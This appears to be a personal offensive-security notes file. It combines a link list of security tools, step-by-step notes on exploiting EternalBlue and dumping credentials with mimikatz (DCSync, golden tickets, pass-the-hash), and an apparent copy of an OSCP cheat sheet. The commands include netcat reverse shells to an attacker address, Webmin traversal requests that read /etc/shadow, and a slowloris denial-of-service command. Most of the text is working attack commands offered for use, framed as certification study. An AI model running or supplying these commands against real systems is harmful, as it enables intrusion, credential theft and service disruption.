                https://www.cisa.gov/sites/default/files/publications/Federal_Government_Cybersecurity_Incident_and_Vulnerability_Response_Playbooks_508C.pdf (CISA Cybersecurity Incident and Vulnerability Response Playbooks)
                https://www.cisecurity.org/benchmark/amazon_web_services (A step-by-step checklist to secure Amazon Web Services)
                https://www.cisecurity.org/cis-benchmarks (CIS Benchmarks List)
                https://www.coursera.org/learn/crypto (Cryptography I Course by Dan Boneh (Stanford))
                https://www.cybrary.it (Cybrary's accessible, affordable training platform provides curated career paths, threat-informed training, and certification preparation for professionals at all levels.)
                https://www.edx.org/learn/cybersecurity (Explore cybersecurity courses and certificates)
                https://www.macchaffee.com/blog/2022/k8s-under-documented-security-tips (Kubernetes Under-Documented Security Tips)
                https://www.netmeister.org/blog/infosec-competencies.html ((Technical) Infosec Core Competencies)
                https://www.nsa.gov/Podcast (“NSA is known as home to the world’s greatest codemakers and codebreakers—their stories are now being decoded.)
                https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/nsa-cisa-release-kubernetes-hardening-guidance/utm_source/nsa-cisa-release-kubernetes-hardening-guidance (NSA, CISA release Kubernetes Hardening Guidance)
                https://www.open-scap.org (Discover a wide array of tools for managing system security and standards compliance)
                https://www.reddit.com/r/dataisbeautiful/comments/1cb48y6/oc_i_updated_our_password_table_for_2024_with/#lightbox (Time it takes a hacker to brute force your password in 2024)
                https://www.reddit.com/r/netsec+privacy+SocialEngineering+onions+ReverseEngineering+crypto+blackhat+security+Malware+pwned+netsecstudents+computerforensics+HackBloc+securityCTF+xss+vrd+rootkit+REMath
                https://www.reddit.com/r/netsecstudents/top/?sort=top&t=all
                https://www.returnonsecurity.com/p/2023-cybersecurity-market-review (The Cybersecurity Market in 2023)
                https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets
                https://youtu.be/l8iXMgk2nnY?si=gz-Xi49_yk9pInGG (VIM tutorial: linux terminal tools for bug bounty pentest and redteams with @tomnomnom)
                https://pinboard.in/u:SharjeelSayed/t:security

            Security Tools:
                https://cipher387.github.io/osint_stuff_tool_collection (OSINT Tool Collection)
                https://github.com/A-poc/RedTeam-Tools (Tools and Techniques for Red Team / Penetration Testing)
                https://github.com/a13xp0p0v/kernel-hardening-checker (A tool for checking the security hardening options of the Linux kernel)
                https://github.com/aquasecurity/cloudsploit (CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub.)
                https://github.com/armosec/kubescape (kubescape is the first tool for testing if Kubernetes is deployed securely as defined in Kubernetes Hardening Guidance by to NSA and CISA)
                https://github.com/bettercap/bettercap (The Swiss Army knife for 802.11, BLE, IPv4 and IPv6 networks reconnaissance and MITM attacks.)
                https://github.com/BishopFox/cloudfox (Open source command line tool created to help penetration testers and other offensive security professionals find exploitable  attack paths in cloud infrastructure)
                https://github.com/BushidoUK/Ransomware-Tool-Matrix (https://blog.bushidotoken.net/2024/08/the-ransomware-tool-matrix.html A resource containing all the tools each ransomware gangs uses)
                https://github.com/cugu/awesome-forensics ( A curated list of awesome forensic analysis tools and resources http://cugu.github.io/awesome-forensics )
                https://github.com/devsecops/awesome-devsecops (https://www.devsecops.org An authoritative list of awesome devsecops tools with the help from community experiments and contributions.)
                https://github.com/gchq/CyberChef (https://gchq.github.io/CyberChef The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis)
                https://github.com/iacsecurity/tool-compare (infrastructure-as-code security tools comparison)
                https://github.com/infobyte/faraday (https://faradaysec.com Open Source Vulnerability Management Platform)
                https://github.com/jtesta/ssh-audit (SSH server & client security auditing (banner, key exchange, encryption, mac, compression, compatibility, security, etc))
                https://github.com/Kyuu-Ji/Awesome-Azure-Pentest (A collection of resources, tools and more for penetration testing and securing Microsofts cloud platform Azure.)
                https://github.com/Lissy93/web-check (🌐 All-in-one OSINT tool for analysing any website)
                https://github.com/Manisso/fsociety (fsociety Hacking Tools Pack – A Penetration Testing Framework)
                https://github.com/prowler-cloud/prowler (https://prowler.pro Prowler is an Open Source Security tool for AWS, Azure and GCP to perform Cloud Security best practices assessments, audits, incident response, compliance, continuous monitoring, hardening and forensics readiness. Includes CIS, NIST 800, NIST CSF, CISA, FedRAMP, PCI-DSS, GDPR, HIPAA, FFIEC, SOC2, GXP, Well-Architected Security, ENS and more.)
                https://github.com/prowler-cloud/prowler (https://prowler.pro Prowler is an Open Source Security tool for AWS, Azure and GCP to perform Cloud Security best practices assessments, audits, incident response, compliance, continuous monitoring, hardening and forensics readiness. Includes CIS, NIST 800, NIST CSF, CISA, FedRAMP, PCI-DSS, GDPR, HIPAA, FFIEC, SOC2, GXP, Well-Architected Security, ENS and more.)
                https://github.com/robertdavidgraham/masscan (TCP port scanner, spews SYN packets asynchronously, scanning entire Internet in under 5 minutes.)
                https://github.com/toniblyx/my-arsenal-of-aws-security-tools (List of open source tools for AWS security: defensive, offensive, auditing, DFIR, etc.)
                https://github.com/vm32/Linux-Incident-Response (practical toolkit for cybersecurity and IT professionals. It features a detailed Linux cheatsheet for incident response)
                https://github.com/vulhub/vulhub (https://vulhub.org Pre-Built Vulnerable Environments Based on Docker-Compose)
                https://github.com/wazuh/wazuh (Wazuh - The Open Source Security Platform. Unified XDR and SIEM protection for endpoints and cloud workloads. https://wazuh.com )
                https://github.com/Z4nzu/hackingtool (ALL IN ONE Hacking Tool For Hackers forms.gle/ntuAX8BGRR5yAb9ZA)
                https://gtfobins.github.io (GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.)
                https://netfilter.org/documentation (Documentation about the netfilter/iptables project)
                https://offsec.tools (A vast collection of security tools)
                https://tools.tldr.run (Curated list of security tools for Hackers & Builders!)
                
////////////////////////////////

how to explooit MS17-010  EternalBlue 

nmap -p445 --script smb-vuln-ms17-010 <target_ip>

msfconsole

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS <target_ip>
set LHOST <attacker_ip>
set LPORT <attacker_port>
set PAYLOAD windows/x64/meterpreter/reverse_tcp

exploit

-------

**Exploiting Manually using Python and Exploit Code**

git clone https://github.com/worawit/MS17-010.git
cd MS17-010

gcc -o eternalblue_poc eternalblue_poc.c

python eternalblue_exploit.py <target_ip>

**4. Post-Exploitation:**

mimikatz

download repo - GitHub: https://github.com/gentilkiwi/mimikatz
Command Prompt with administrator 
cd <path_to_mimikatz>

mimikatz.exe

privilege::debug       [If successful, you'll see Privilege '20' OK]

sekurlsa::logonpasswords

lsadump::secrets

lsadump::sam

sekurlsa::tickets

sekurlsa::tickets /export

kerberos::ptt <ticket_file.kirbi>

sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:<command>

**ex. sekurlsa::pth /user:admin /domain:example.com /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:cmd**

lsadump::dcsync /user:<domain>\krbtgt

kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:<rid>

kerberos::ptt <ticket_file.kirbi>

kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /target:<target_machine> /rc4:<ntlm_hash> /service:<service_name>

dpapi::cred
dpapi::wifi

(credentials dumping )

///////////////////////////

# OSCP-Survival-Guide
Kali Linux Offensive Security Certified Professional Playbook

 **NOTE: This document reffers to the target ip as the export variable $ip.**  
 
 **To set this value on the command line use the following syntax:**
 
 **export ip=192.168.1.100**
 
 
***UPDATE: October 2, 2017***
Thanks for all the Stars! Wrote my OSCP exam last night, did not pass sadly ... but I recorded a stop motion video of my failed attempt. TRY HARDER!

https://www.youtube.com/watch?v=HBMZWl9zcsc

The good news is that I will be learning more and adding more content to this guide :D


## Table of Contents
- [Kali Linux](#kali-linux)
- [Information Gathering & Vulnerability Scanning](#information-gathering--vulnerability-scanning)
  * [Passive Information Gathering](#passive-information-gathering)
  * [Active Information Gathering](#active-information-gathering)
  * [Port Scanning](#port-scanning)
  * [Enumeration](#enumeration)
  * [HTTP Enumeration](#http-enumeration)
- [Buffer Overflows and Exploits](#buffer-overflows-and-exploits)
- [Shells](#shells)
- [File Transfers](#file-transfers)
- [Privilege Escalation](#privilege-escalation)
  * [Linux Privilege Escalation](#linux-privilege-escalation)
  * [Windows Privilege Escalation](#windows-privilege-escalation)
- [Client, Web and Password Attacks](#client-web-and-password-attacks)
  * [Client Attacks](#client-attacks)
  * [Web Attacks](#web-attacks)
  * [File Inclusion Vulnerabilities LFI/RFI](#file-inclusion-vulnerabilities)
  * [Database Vulnerabilities](#database-vulnerabilities)
  * [Password Attacks](#password-attacks)
  * [Password Hash Attacks](#password-hash-attacks)
- [Networking, Pivoting and Tunneling](#networking-pivoting-and-tunneling)
- [The Metasploit Framework](#the-metasploit-framework)
- [Bypassing Antivirus Software](#bypassing-antivirus-software)

Kali Linux
========================================================================================================

-   Set the Target IP Address to the `$ip` system variable  
    `export ip=192.168.1.100`

-   Find the location of a file  
    `locate sbd.exe`

-   Search through directories in the `$PATH` environment variable  
    `which sbd`

-   Find a search for a file that contains a specific string in it’s
    name:  
    `find / -name sbd\*`

-   Show active internet connections  
    `netstat -lntp`

-   Change Password  
    `passwd`

-   Verify a service is running and listening  
    `netstat -antp |grep apache`

-   Start a service  
    `systemctl start ssh  `
    
    `systemctl start apache2`

-   Have a service start at boot  
    `systemctl enable ssh`

-   Stop a service  
    `systemctl stop ssh`

-   Unzip a gz file  
    `gunzip access.log.gz`

-   Unzip a tar.gz file  
    `tar -xzvf file.tar.gz`

-   Search command history  
    `history | grep phrase_to_search_for`

-   Download a webpage  
    `wget http://www.cisco.com`

-   Open a webpage  
    `curl http://www.cisco.com`

-   String manipulation

    -   Count number of lines in file  
        `wc index.html`

    -   Get the start or end of a file  
        `head index.html`
        
        `tail index.html`

    -   Extract all the lines that contain a string  
        `grep "href=" index.html`

    -   Cut a string by a delimiter, filter results then sort  
        `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`

    -   Using Grep and regular expressions and output to a file  
        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`

    -   Use a bash loop to find the IP address behind each host  
        `for url in $(cat list.txt); do host $url; done`

    -   Collect all the IP Addresses from a log file and sort by
        frequency  
        `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`

-   Decoding using Kali

    -   Decode Base64 Encoded Values
       
        `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`

    -   Decode Hexidecimal Encoded Values  
        `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`

-   Netcat - Read and write TCP and UDP Packets

    -   Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)

    -   Connect to a POP3 mail server  
        `nc -nv $ip 110`

    -   Listen on TCP/UDP port  
        `nc -nlvp 4444`

    -   Connect to a netcat port  
        `nc -nv $ip 4444`

    -   Send a file using netcat  
        `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`

    -   Receive a file using netcat  
        `nc -nlvp 4444 > incoming.exe`
        
    -   Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...
         
            whereis nc
            nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

            /bin/nc.traditional -e /bin/bash 1.2.3.4 4444


    -   Create a reverse shell with Ncat using cmd.exe on Windows  
        `nc.exe -nlvp 4444 -e cmd.exe`
        
        or
        
        `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`

    -   Create a reverse shell with Ncat using bash on Linux  
        `nc -nv $ip 4444 -e /bin/bash`
        
    -   Netcat for Banner Grabbing:
    
        `echo "" | nc -nv -w1 <IP Address> <Ports>`

-   Ncat - Netcat for Nmap project which provides more security avoid
    IDS

    -   Reverse shell from windows using cmd.exe using ssl  
        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`

    -   Listen on port 4444 using ssl  
        `ncat -v $ip 4444 --ssl`

-   Wireshark
    -   Show only SMTP (port 25) and ICMP traffic:
    
        `tcp.port eq 25 or icmp`
        
    -   Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
        
        `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`
        
    -   Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
        
        `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`
        
    -   Some commands are equal
        
        `ip.addr == xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx `

        ` ip.addr != xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`

-   Tcpdump

    -   Display a pcap file  
       `tcpdump -r passwordz.pcap`

    -   Display ips and filter and sort  
        `tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head`

    -   Grab a packet capture on port 80  
        `tcpdump tcp port 80 -w output.pcap -i eth0`

    -   Check for ACK or PSH flag set in a TCP packet  
        `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`

-   IPTables 

    -   Deny traffic to ports except for Local Loopback

        `iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP  `
    
        `iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP`

    -   Clear ALL IPTables firewall rules
    
            iptables -P INPUT ACCEPT
            iptables -P FORWARD ACCEPT
            iptables -P OUTPUT ACCEPT
            iptables -t nat -F
            iptables -t mangle -F
            iptables -F
            iptables -X
            iptables -t raw -F iptables -t raw -X

Information Gathering & Vulnerability Scanning
===================================================================================================================================

-   Passive Information Gathering
    ---------------------------------------------------------------------------------------------------------------------------

-   Google Hacking

    -   Google search to find website sub domains  
        `site:microsoft.com`

    -   Google filetype, and intitle  
        `intitle:"netbotz appliance" "OK" -filetype:pdf`

    -   Google inurl  
        `inurl:"level/15/sexec/-/show"`

    -   Google Hacking Database:  
        https://www.exploit-db.com/google-hacking-database/

-   SSL Certificate Testing  
    [https://www.ssllabs.com/ssltest/analyze.html](https://www.ssllabs.com/ssltest/analyze.html)

-   Email Harvesting

    -   Simply Email  
        `git clone https://github.com/killswitch-GUI/SimplyEmail.git  `
        
        `./SimplyEmail.py -all -e TARGET-DOMAIN`

-   Netcraft

    -   Determine the operating system and tools used to build a site  
        https://searchdns.netcraft.com/

-   Whois Enumeration  
    `whois domain-name-here.com  `
    
    `whois $ip`

-   Banner Grabbing

    -   `nc -v $ip 25`

    -   `telnet $ip 25`

    -   `nc TARGET-IP 80`

-   Recon-ng - full-featured web reconnaissance framework written in Python

    -   `cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git  `
    
        `cd /opt/recon-ng  `
        
        `./recon-ng  `
        
        `show modules  `
        
        `help`

-   Active Information Gathering
    --------------------------------------------------------------------------------------------------------------------------

<!-- -->


-   Port Scanning
    -----------------------------------------------------------------------------------------------------------
*Subnet Reference Table*

/ | Addresses | Hosts | Netmask | Amount of a Class C
--- | --- | --- | --- | --- 
/30 | 4 | 2 | 255.255.255.252| 1/64
/29 | 8 | 6 | 255.255.255.248 | 1/32
/28 | 16 | 14 | 255.255.255.240 | 1/16
/27 | 32 | 30 | 255.255.255.224 | 1/8
/26 | 64 | 62 | 255.255.255.192 | 1/4
/25 | 128 | 126 | 255.255.255.128 | 1/2
/24 | 256 | 254 | 255.255.255.0 | 1
/23 | 512 | 510 | 255.255.254.0 | 2
/22 | 1024 | 1022 | 255.255.252.0 | 4
/21 | 2048 | 2046 | 255.255.248.0 | 8
/20 | 4096 | 4094 | 255.255.240.0 | 16
/19 | 8192 | 8190 | 255.255.224.0 | 32
/18 | 16384 | 16382 | 255.255.192.0 | 64
/17 | 32768 | 32766 | 255.255.128.0 | 128
/16 | 65536 | 65534 | 255.255.0.0 | 256

 -   Set the ip address as a varble  
     `export ip=192.168.1.100  `
     `nmap -A -T4 -p- $ip`

 -   Netcat port Scanning  
     `nc -nvv -w 1 -z $ip 3388-3390`
     
 -   Discover active IPs usign ARP on the network:
     `arp-scan $ip/24`

 -   Discover who else is on the network  
     `netdiscover`

 -   Discover IP Mac and Mac vendors from ARP  
     `netdiscover -r $ip/24`

 -   Nmap stealth scan using SYN  
     `nmap -sS $ip`

 -   Nmap stealth scan using FIN  
     `nmap -sF $ip`

 -   Nmap Banner Grabbing  
     `nmap -sV -sT $ip`

 -   Nmap OS Fingerprinting  
     `nmap -O $ip`

 -   Nmap Regular Scan:  
     `nmap $ip/24`

 -   Enumeration Scan  
     `nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt`

 -   Enumeration Scan All Ports TCP / UDP and output to a txt file  
     `nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip`

 -   Nmap output to a file:  
     `nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24`

 -   Quick Scan:  
     `nmap -T4 -F $ip/24`

 -   Quick Scan Plus:  
     `nmap -sV -T4 -O -F --version-light $ip/24`

 -   Quick traceroute  
     `nmap -sn --traceroute $ip`

 -   All TCP and UDP Ports  
     `nmap -v -sU -sS -p- -A -T4 $ip`

 -   Intense Scan:  
     `nmap -T4 -A -v $ip`

 -   Intense Scan Plus UDP  
     `nmap -sS -sU -T4 -A -v $ip/24`

 -   Intense Scan ALL TCP Ports  
     `nmap -p 1-65535 -T4 -A -v $ip/24`

 -   Intense Scan - No Ping  
     `nmap -T4 -A -v -Pn $ip/24`

 -   Ping scan  
     `nmap -sn $ip/24`

 -   Slow Comprehensive Scan  
     `nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24`

 -   Scan with Active connect in order to weed out any spoofed ports designed to troll you  
     `nmap -p1-65535 -A -T5 -sT $ip`

-   Enumeration
    -----------

-   DNS Enumeration

    -   NMAP DNS Hostnames Lookup
        `nmap -F --dns-server <dns server ip> <target ip range>`
        
    -   Host Lookup  
        `host -t ns megacorpone.com`

    -   Reverse Lookup Brute Force - find domains in the same range  
        `for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"`

    -   Perform DNS IP Lookup  
        `dig a domain-name-here.com @nameserver`

    -   Perform MX Record Lookup  
        `dig mx domain-name-here.com @nameserver`

    -   Perform Zone Transfer with DIG  
        `dig axfr domain-name-here.com @nameserver`

    -   DNS Zone Transfers  
        Windows DNS zone transfer  
        
        `nslookup -> set type=any -> ls -d blah.com  `
        
        Linux DNS zone transfer  
        
        `dig axfr blah.com @ns1.blah.com`
        
    -   Dnsrecon DNS Brute Force  
        `dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`

    -   Dnsrecon DNS List of megacorp  
        `dnsrecon -d megacorpone.com -t axfr`

    -   DNSEnum  
        `dnsenum zonetransfer.me`

-   NMap Enumeration Script List:

    -   NMap Discovery  
        [*https://nmap.org/nsedoc/categories/discovery.html*](https://nmap.org/nsedoc/categories/discovery.html)

    -   Nmap port version detection MAXIMUM power  
        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`


-   NFS (Network File System) Enumeration

    -   Show Mountable NFS Shares 
        `nmap -sV --script=nfs-showmount $ip`

-   RPC (Remote Procedure Call) Enumeration

    -   Connect to an RPC share without a username and password and enumerate privledges
        `rpcclient --user="" --command=enumprivs -N $ip`

    -   Connect to an RPC share with a username and enumerate privledges
        `rpcclient --user="<Username>" --command=enumprivs $ip`


-   SMB Enumeration

    -   SMB OS Discovery  
        `nmap $ip --script smb-os-discovery.nse`

    -   Nmap port scan  
        `nmap -v -p 139,445 -oG smb.txt $ip-254`

    -   Netbios Information Scanning  
        `nbtscan -r $ip/24`

    -   Nmap find exposed Netbios servers  
        `nmap -sU --script nbstat.nse -p 137 $ip`
        
    -   Nmap all SMB scripts scan
    
        `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    -   Nmap all SMB scripts authenticated scan
    
        `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    -   SMB Enumeration Tools  
        `nmblookup -A $ip  `
        
        `smbclient //MOUNT/share -I $ip -N  `
        
        `rpcclient -U "" $ip  `
        
        `enum4linux $ip  `
        
        `enum4linux -a $ip`
        

    -   SMB Finger Printing  
        `smbclient -L //$ip`

    -   Nmap Scan for Open SMB Shares  
        `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`

    -   Nmap scans for vulnerable SMB Servers  
        `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`

    -   Nmap List all SMB scripts installed  
        `ls -l /usr/share/nmap/scripts/smb*`

    -   Enumerate SMB Users
    
        `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14`
        
         OR        
         
         `python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip`
         

    -   RID Cycling - Null Sessions  
        `ridenum.py $ip 500 50000 dict.txt`

    -   Manual Null Session Testing
    
        Windows: `net use \\$ip\IPC$ "" /u:""`
        
        Linux: `smbclient -L //$ip`
        

-   SMTP Enumeration - Mail Severs

    -   Verify SMTP port using Netcat  
        `nc -nv $ip 25`

-   POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet

         root@kali:~# telnet $ip 110
         +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
         USER billydean    
         +OK
         PASS password
         +OK Welcome billydean
         
         list
         
         +OK 2 1807
         1 786
         2 1021
      
         retr 1
         
         +OK Message follows
         From: jamesbrown@motown.com
         Dear Billy Dean,

         Here is your login for remote desktop ... try not to forget it this time!
         username: billydean
         password: PA$$W0RD!Z


-   SNMP Enumeration -Simple Network Management Protocol

    -   Fix SNMP output values so they are human readable  
        `apt-get install snmp-mibs-downloader download-mibs  `
        `echo "" > /etc/snmp/snmp.conf`

    -   SNMP Enumeration Commands

        -   `snmpcheck -t $ip -c public`

        -   `snmpwalk -c public -v1 $ip 1|`

        -   `grep hrSWRunName|cut -d\* \* -f`

        -   `snmpenum -t $ip`

        -   `onesixtyone -c names -i hosts`

    -   SNMPv3 Enumeration  
        `nmap -sV -p 161 --script=snmp-info $ip/24`

    -   Automate the username enumeration process for SNMPv3:  
        `apt-get install snmp snmp-mibs-downloader  `
        `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`

    -   SNMP Default Credentials  
        /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt


-   MS SQL Server Enumeration

    -   Nmap Information Gathering
        
        `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`
        
-   Webmin and miniserv/0.01 Enumeration - Port 10000

      Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
        
        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`
        
      Test to see if webmin is running as root by grabbing /etc/shadow
      
        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`

-   Linux OS Enumeration

    -   List all SUID files  
        `find / -perm -4000 2>/dev/null`

    -   Determine the current version of Linux  
        `cat /etc/issue`

    -   Determine more information about the environment  
        `uname -a`
        
    -   List processes running  
        `ps -xaf`

    -   List the allowed (and forbidden) commands for the invoking use  
        `sudo -l`

    -   List iptables rules  
        `iptables --table nat --list  
        iptables -vL -t filter  
        iptables -vL -t nat  
        iptables -vL -t mangle  
        iptables -vL -t raw  
        iptables -vL -t security`

-   Windows OS Enumeration


    -   net config Workstation
    
    -   systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    
    -   hostname
    
    -   net users
    
    -   ipconfig /all
    
    -   route print
    
    -   arp -A
    
    -   netstat -ano
    
    -   netsh firewall show state	
    
    -   netsh firewall show config
    
    -   schtasks /query /fo LIST /v
    
    -   tasklist /SVC
    
    -   net start
    
    -   DRIVERQUERY
    
    -   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    
    -   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    
    -   dir /s *pass* == *cred* == *vnc* == *.config*
    
    -   findstr /si password *.xml *.ini *.txt
    
    -   reg query HKLM /f password /t REG_SZ /s
    
    -   reg query HKCU /f password /t REG_SZ /s

-   Vulnerability Scanning with Nmap

-   Nmap Exploit Scripts  
    [*https://nmap.org/nsedoc/categories/exploit.html*](https://nmap.org/nsedoc/categories/exploit.html)

-   Nmap search through vulnerability scripts  
    `cd /usr/share/nmap/scripts/  
    ls -l \*vuln\*`

-   Nmap search through Nmap Scripts for a specific keyword  
    `ls /usr/share/nmap/scripts/\* | grep ftp`

-   Scan for vulnerable exploits with nmap  
    `nmap --script exploit -Pn $ip`

-   NMap Auth Scripts  
    [*https://nmap.org/nsedoc/categories/auth.html*](https://nmap.org/nsedoc/categories/auth.html)

-   Nmap Vuln Scanning  
    [*https://nmap.org/nsedoc/categories/vuln.html*](https://nmap.org/nsedoc/categories/vuln.html)

-   NMap DOS Scanning  
    `nmap --script dos -Pn $ip  
    NMap Execute DOS Attack  
    nmap --max-parallelism 750 -Pn --script http-slowloris --script-args
    http-slowloris.runforever=true`

-   Scan for coldfusion web vulnerabilities  
    `nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip`

-   Anonymous FTP dump with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

-   SMB Security mode scan with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

-   File Enumeration

    -   Find UID 0 files root execution

    -   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`

    -   Get handy linux file system enumeration script (/var/tmp)  
        `wget https://highon.coffee/downloads/linux-local-enum.sh  `
        `chmod +x ./linux-local-enum.sh  `
        `./linux-local-enum.sh`

    -   Find executable files updated in August  
        `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`

    -   Find a specific file on linux  
        `find /. -name suid\*`

    -   Find all the strings in a file  
        `strings <filename>`

    -   Determine the type of a file  
        `file <filename>`

-   HTTP Enumeration
    ----------------

    -   Search for folders with gobuster:  
        `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip`

    -   OWasp DirBuster - Http folder enumeration - can take a dictionary file

    -   Dirb - Directory brute force finding using a dictionary file  
        `dirb http://$ip/ wordlist.dict  `
        `dirb <http://vm/>  `
          
        Dirb against a proxy

    -   `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`

    -   Nikto  
        `nikto -h $ip`

    -   HTTP Enumeration with NMAP  
        `nmap --script=http-enum -p80 -n $ip/24`

    -   Nmap Check the server methods  
        `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`

    -   Get Options available from web server
         `curl -vX OPTIONS vm/test`

      -   Uniscan directory finder:  
          `uniscan -qweds -u <http://vm/>`

      -   Wfuzz - The web brute forcer
      
          `wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test  `
          
          `wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ  `
          
          `wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"`
          
          `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ`
          
          Recurse level 3
          
          `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`

<!-- -->

-   Open a service using a port knock (Secured with Knockd)  
    for x in 7000 8000 9000; do nmap -Pn --host\_timeout 201
    --max-retries 0 -p $x server\_ip\_address; done

-   WordPress Scan - Wordpress security scanner

    -   wpscan --url $ip/blog --proxy $ip:3129

-   RSH Enumeration - Unencrypted file transfer system

    -   auxiliary/scanner/rservices/rsh\_login

-   Finger Enumeration

    -   finger @$ip

    -   finger batman@$ip

-   TLS & SSL Testing

    -   ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha >
        OUTPUT-FILE.html

-   Proxy Enumeration (useful for open proxies)

    -   nikto -useproxy http://$ip:3128 -h $ip

-   Steganography

> apt-get install steghide
>
> steghide extract -sf picture.jpg
>
> steghide info picture.jpg
>
> apt-get install stegosuite

-   The OpenVAS Vulnerability Scanner

    -   apt-get update  
        apt-get install openvas  
        openvas-setup

    -   netstat -tulpn

    -   Login at:  
        https://$ip:9392

Buffer Overflows and Exploits
===================================================================================================================================

